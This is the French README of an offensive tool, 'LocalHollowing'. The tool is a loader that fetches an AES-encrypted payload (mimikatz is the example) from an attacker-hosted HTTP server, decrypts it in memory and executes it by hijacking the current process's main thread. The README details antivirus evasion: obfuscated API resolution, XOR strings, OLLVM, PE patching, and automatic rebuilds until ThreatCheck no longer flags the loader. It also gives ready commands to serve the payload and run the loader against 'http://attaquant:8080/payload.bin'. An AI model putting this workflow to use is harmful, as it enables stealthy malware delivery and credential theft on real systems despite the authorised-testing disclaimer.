# LocalHollowing

Loader offensif basé sur la technique de **Local Hollowing**, conçu dans un cadre de recherche en sécurité offensive et de tests d'intrusion autorisés.

> **Avertissement** : Ce projet est destiné exclusivement à des fins éducatives, de recherche en sécurité et de tests d'intrusion dans des environnements autorisés. Toute utilisation non autorisée est illégale.

---

## Vue d'ensemble

Ce projet produit **deux artefacts distincts** à déployer séparément :

| Artefact | Rôle | Où |
|---|---|---|
| `LocalHollowing_clean.exe` | Le **loader** — s'exécute sur la cible | Machine cible |
| `payload.bin` | Le **payload chiffré** — hébergé sur un serveur HTTP | Serveur attaquant |

Le loader ne contient **aucun payload embarqué**. Au moment de l'exécution, il contacte l'URL passée en argument pour télécharger `payload.bin`, le déchiffre en mémoire, et l'exécute via Local Hollowing. Le payload ne touche jamais le disque de la cible.

---

## Architecture de la pipeline de build

La pipeline génère les deux artefacts à partir d'un PE source :

```
[Machine de build]

input/payload.exe  ──────────────────────────────────────────────────┐
       │                                                              │
       ▼                                                              │
[1] Chiffrement AES-256-CBC                                           │
    clé aléatoire → mimi_key.h embarquée dans le loader              │
       │                                                              ▼
       │                                              output/payload.bin
       │                                              (à héberger sur serveur HTTP)
       ▼
[2] Génération resolve.h (XOR-obfuscation des noms d'API)
       │
       ▼
[3] Compilation du LOADER avec OLLVM (flags randomisés)
    → le loader est obfusqué, pas le payload
       │
       ▼
[4] Patch PE du loader (Rich Header, timestamp, entropie)
       │
       ▼
[5] ThreatCheck sur le loader
    clean ?  ──yes──▶  output/LocalHollowing_clean.exe
    non      ──────▶  retry avec nouvelle seed OLLVM (jusqu'à 10x)
```

---

## Fonctionnement du loader à l'exécution

Le Local Hollowing consiste à remplacer le contexte d'exécution du thread principal du **processus courant** par un payload, sans créer de nouveau processus ni écrire sur le disque.

```
[Machine cible]

LocalHollowing_clean.exe http://attaquant:8080/payload.bin
       │
       ├─ Thread secondaire créé
       │        │
       │        ├─ [1] Suspend le thread principal
       │        ├─ [2] Télécharge payload.bin depuis le serveur HTTP
       │        ├─ [3] Déchiffre le payload en mémoire (AES-256-CBC)
       │        ├─ [4] Mappe le PE manuellement (headers, sections, relocs, IAT)
       │        ├─ [5] Applique les permissions par section (RW → RX)
       │        ├─ [6] Redirige RIP du thread principal vers l'entry point
       │        └─ [7] Reprend le thread principal → exécution du payload
       │
       └─ Le processus courant exécute désormais le payload
```

---

## Mesures d'évasion statique

| Technique | Détail |
|---|---|
| **Résolution d'API dynamique** | Zéro import suspect — PEB walk + parcours de la table d'exports |
| **Obfuscation des strings** | Noms d'API et DLL XOR-encodés avec clé aléatoire par build |
| **Chiffrement du payload** | AES-256-CBC, clé 16 octets générée aléatoirement à chaque pipeline |
| **Obfuscation OLLVM** | BCF, FLA, SUB, SPLIT avec paramètres randomisés |
| **Boucle ThreatCheck** | Rebuild automatique jusqu'à validation (10 tentatives max) |
| **Permissions mémoire** | Allocation RW → VirtualProtect RX par section, jamais de RWX global |
| **Rich Header** | Zéroé en post-build |
| **PE Timestamp** | Zéroé en post-build |
| **Réduction d'entropie** | Section `.pad` 32 Ko de données basse entropie injectée |

---

## Prérequis

### Windows (machine de build)
- Visual Studio 2022+ avec LLVM/OLLVM (clang-cl, lld-link)
- Python 3.x + `pycryptodome` : `pip install pycryptodome`
- [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)
- PowerShell 5.1+

### Chemins à configurer dans `scripts/build.ps1`
```powershell
$VCVARSALL = "C:\Program Files\Microsoft Visual Studio\...\vcvarsall.bat"
$OLLVM_BIN = "C:\Program Files\Microsoft Visual Studio\...\Llvm\x64\bin"
```

Et dans `scripts/run_pipeline.ps1` :
```powershell
$ThreatCheck = "C:\chemin\vers\ThreatCheck.exe"
```

---

## Utilisation

### 1. Préparer le payload
Placer le PE cible dans `input/` :
```
input/
└── mimikatz.exe
```

### 2. Lancer la pipeline
```powershell
.\scripts\run_pipeline.ps1
```

Avec options :
```powershell
# Chemin payload explicite
.\scripts\run_pipeline.ps1 -InputPath input\autre.exe

# Build sans OLLVM (debug)
.\scripts\run_pipeline.ps1 -NoObf

# ThreatCheck alternatif + limite de tentatives
.\scripts\run_pipeline.ps1 -ThreatCheck "C:\autre\ThreatCheck.exe" -MaxAttempts 15
```

### 3. Servir le payload
```powershell
python -m http.server 8080 --directory output
```

### 4. Exécuter le loader
```powershell
.\output\LocalHollowing_clean.exe http://<IP>:8080/payload.bin
```

---

## Structure du projet

```
local-hollowing/
├── LocalHollowing/
│   ├── main.cpp          # Loader principal (download, decrypt, map, hijack)
│   ├── peb_walk.h        # PEB walk + export table (remplace GetModuleHandleA/GetProcAddress)
│   ├── resolve.h         # Auto-généré : résolution d'API XOR-obfusquée
│   └── mimi_key.h        # Auto-généré : clé AES + PAYLOAD_SIZE
├── scripts/
│   ├── run_pipeline.ps1  # Orchestrateur principal
│   ├── build.ps1         # Compilation OLLVM avec flags randomisés
│   ├── encrypt_and_convert.py  # Chiffrement AES-256-CBC du payload
│   ├── generate_resolve.py     # Génération de resolve.h avec XOR
│   └── patch_pe.py             # Post-build : Rich Header, timestamp, entropie
├── input/                # Payload source à placer ici
├── output/               # Artefacts générés
└── config.json           # Liste des API à résoudre dynamiquement
```

---

## Pipeline détaillée

| Étape | Script | Sortie |
|---|---|---|
| Chiffrement payload | `encrypt_and_convert.py` | `output/payload.bin`, `output/mimi_key.h` |
| Génération resolve.h | `generate_resolve.py` | `output/resolve.h` |
| Compilation OLLVM | `build.ps1` | `output/LocalHollowing.exe` |
| Patch PE | `patch_pe.py` | Modification in-place du binaire |
| Validation ThreatCheck | `run_pipeline.ps1` | `output/LocalHollowing_clean.exe` |

---

## Ajouter une API à résoudre dynamiquement

Éditer `config.json` et relancer la pipeline :
```json
{
  "name": "NomDeLaFonction",
  "dll": "nom.dll",
  "return_type": "TYPE_RETOUR",
  "calling_convention": "WINAPI",
  "params": ["TYPE1", "TYPE2"]
}
```

---

## Limitations connues

- Payloads **.NET (MSIL)** non supportés — nécessite un CLR hosting
- Payloads **x86** non supportés — loader compilé en x64 uniquement
- Payloads sans table de relocation (`/FIXED`) peuvent échouer au mapping

---

## Licence

Ce projet est publié à des fins de recherche et d'éducation en sécurité offensive.  
**Usage réservé aux environnements autorisés.**
